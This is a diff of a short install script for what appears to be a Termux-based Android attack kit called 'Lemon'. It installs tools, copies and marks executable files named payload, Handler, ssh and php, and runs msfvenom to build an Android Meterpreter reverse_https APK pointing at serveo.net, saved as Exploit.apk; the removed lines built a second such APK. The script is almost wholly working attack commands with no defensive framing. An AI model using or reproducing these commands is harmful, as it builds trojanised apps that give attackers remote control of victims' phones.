@@ -1,16 +1,15 @@
-clear && pkg install figlet
-clear && cp 4716.py P.py error.py O.py dep.py error_pay.py $PREFIX/opt
-cp payload payload6 ssh php Handler Handler6 $HOME
+clear
+pkg install figlet
+pkg install python
+clear && cp Handler payload ssh php $HOME
 cd
 chmod +x php
 chmod +x ssh
 chmod +x payload
-chmod +x payload6
 chmod +x Handler
-chmod +x Handler6
 cd Lemon
 clear
-msfvenom -p android/meterpreter/reverse_https LHOST=serveo.net LPORT=4444 R> $HOME/Lemon/Exploit.apk
-msfvenom -p android/meterpreter/reverse_https LHOST=serveo.net LPORT=4716 R> $HOME/Lemon/Exploit6.apk
+echo Please wait..
+msfvenom -p android/meterpreter/reverse_https LHOST=serveo.net LPORT=4716 R> $HOME/Lemon/Exploit.apk
 clear
-python Done.py
+echo Installed Succesfully
